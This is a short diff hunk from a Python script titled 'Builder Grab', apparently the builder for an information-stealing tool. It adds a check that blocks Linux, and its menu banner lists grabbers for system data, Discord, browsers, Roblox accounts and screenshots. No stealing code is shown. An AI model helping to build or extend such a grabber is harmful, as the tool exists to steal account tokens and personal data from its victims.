@@ -1364,6 +1364,10 @@ from tkinter import filedialog
 
 Title("Builder Grab")
 
+if sys.platform.startswith("linux"):
+    "LINUX"
+    OnlyWindows()
+    
 print(f"""{color.WHITE}                      
                       ╔═════════════╦══════════════╦══════════════╦═════════════╦═════════════════╗
                       {color.WHITE}║ {color.RED}System Grab{color.WHITE} ║ {color.RED}Discord Grab{color.WHITE} ║ {color.RED}Browser Grab{color.WHITE} ║ {color.RED}Roblox Grab{color.WHITE} ║ {color.RED}Screenshot Grab{color.WHITE} ║
